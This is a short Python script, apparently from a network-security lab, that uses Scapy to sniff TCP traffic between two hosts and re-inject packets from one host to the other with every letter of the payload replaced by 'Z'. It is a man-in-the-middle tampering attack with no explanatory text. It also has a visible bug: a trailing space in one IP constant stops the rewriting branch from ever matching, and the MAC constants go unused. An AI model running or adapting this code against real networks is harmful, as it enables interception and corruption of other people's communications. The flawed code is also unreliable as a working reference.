#!/usr/bin/python3
from scapy.all import *
import re

VM_A_IP = '10.9.0.5'
VM_B_IP = '10.9.0.6 '
VM_A_MAC = '02:42:0a:09:00:05'
VM_B_MAC = '02:42:0a:09:00:06'

def spoof_pkt(pkt):
    if IP in pkt and TCP in pkt:
        if pkt[IP].src == VM_A_IP and pkt[IP].dst == VM_B_IP and pkt[TCP].payload:
            real = pkt[TCP].payload.load
            try:
                data = real.decode()
                stri = re.sub(r'[a-zA-Z]', 'Z', data)
                new_payload = stri.encode()
                
                # Create new packet with modified payload
                new_pkt = IP(src=pkt[IP].src, dst=pkt[IP].dst) / \
                          TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, 
                              seq=pkt[TCP].seq, ack=pkt[TCP].ack, 
                              flags=pkt[TCP].flags) / new_payload
                
                print("Data transformed from: {} to: {}".format(real.decode(), stri))
                send(new_pkt, verbose=False)
            except Exception as e:
                print("Error processing packet: ", e)

        elif pkt[IP].src == VM_B_IP and pkt[IP].dst == VM_A_IP:
            # Forward packets from VM B to VM A without modification
            send(pkt, verbose=False)

# Sniff packets on the network
sniff(filter='tcp', prn=spoof_pkt)

